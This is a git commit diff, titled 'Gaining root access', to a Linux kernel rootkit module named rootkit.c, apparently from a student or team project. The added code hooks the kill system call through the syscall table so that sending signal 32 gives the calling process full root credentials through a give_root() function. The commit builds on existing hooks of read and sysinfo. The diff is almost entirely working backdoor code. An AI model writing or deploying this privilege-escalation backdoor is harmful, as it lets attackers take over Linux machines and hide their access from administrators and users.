9f868a519d0f678c760569dcbcbc1f29c3bc2bfe
Keywarn <charliehasalamb@icloud.com>
2020-11-24 13:27:40 +0000

    Gaining root access

--- guest/rootkit.c
+++ guest/rootkit.c
@@ -3,6 +3,7 @@
 #include <linux/kernel.h>
 #include <linux/list.h>
 #include <linux/syscalls.h>
+#include <linux/cred.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Finn_Adam_Charlie");
@@ -12,6 +13,8 @@ MODULE_VERSION("0.0.1");
 #define START_ADDRESS 0xffffffff81000000
 #define END_ADDRESS 0xffffffffa2000000
 #define SYS_CALL_NUM 300
+
+#define SIGSUPER 32
 
 #define DISABLE_W_PROTECTED_MEMORY \
     do { \
@@ -32,6 +35,8 @@ unsigned long read_count = 0;
 asmlinkage long (*original_read)(unsigned int, char __user *, size_t);
 
 asmlinkage int (*original_sysinfo)(struct sysinfo *);
+
+asmlinkage int (*original_kill)(pid_t, int);
 
 void hide(void)
 {
@@ -73,7 +78,7 @@ asmlinkage long hacked_read(unsigned int fd, char __user *buf, size_t count)
 {
     read_count ++;
 
-    pr_info("%d reads so far!\n", read_count);
+    //pr_info("%d reads so far!\n", read_count);
     return original_read(fd, buf, count);
 }
 
@@ -84,6 +89,36 @@ asmlinkage int hacked_sysinfo(struct sysinfo *info)
 
     return 0;
 }
+
+void give_root(void)
+{
+    struct cred *newcreds;
+    newcreds = prepare_creds();
+    if (newcreds == NULL)
+    	return;
+    newcreds->uid = newcreds->gid = 0;
+    newcreds->euid = newcreds->egid = 0;
+    newcreds->suid = newcreds->sgid = 0;
+    newcreds->fsuid = newcreds->fsgid = 0;
+ 
+
+    // TODO set the newcreds structure to give root privilege
+    commit_creds(newcreds);
+}
+
+asmlinkage int hacked_kill(pid_t pid, int sig){
+    struct task_struct *task;
+
+    switch(sig) {
+        case SIGSUPER:
+            give_root();
+            break;
+        default:
+            return original_kill(pid, sig);
+    }
+    return 0;
+}
+
 
 static int __init lkm_example_init(void) {
     //Don't hide the kernel for now
@@ -97,10 +132,13 @@ static int __init lkm_example_init(void) {
     void *modified_function_read = hacked_read;
     void **modified_at_address_sysinfo = &sys_call_table[__NR_sysinfo];
     void *modified_function_sysinfo = hacked_sysinfo;
+    void **modified_at_address_kill = &sys_call_table[__NR_kill];
+    void *modified_function_kill = hacked_kill;
 
     DISABLE_W_PROTECTED_MEMORY
     original_read = xchg(modified_at_address_read, modified_function_read);
     original_sysinfo = xchg(modified_at_address_sysinfo, modified_function_sysinfo);
+    original_kill = xchg(modified_at_address_kill, modified_function_kill);
     ENABLE_W_PROTECTED_MEMORY
 
     return 0;
@@ -113,10 +151,13 @@ static void __exit lkm_example_exit(void) {
     void *modified_function_read = original_read;
     void **modified_at_address_sysinfo = &sys_call_table[__NR_sysinfo];
     void *modified_function_sysinfo = original_sysinfo;
+    void **modified_at_address_kill = &sys_call_table[__NR_kill];
+    void *modified_function_kill = original_kill;
 
     DISABLE_W_PROTECTED_MEMORY
     original_read = xchg(modified_at_address_read, modified_function_read);
     original_sysinfo = xchg(modified_at_address_sysinfo, modified_function_sysinfo);
+    original_kill = xchg(modified_at_address_kill, modified_function_kill);
     ENABLE_W_PROTECTED_MEMORY
 }
 
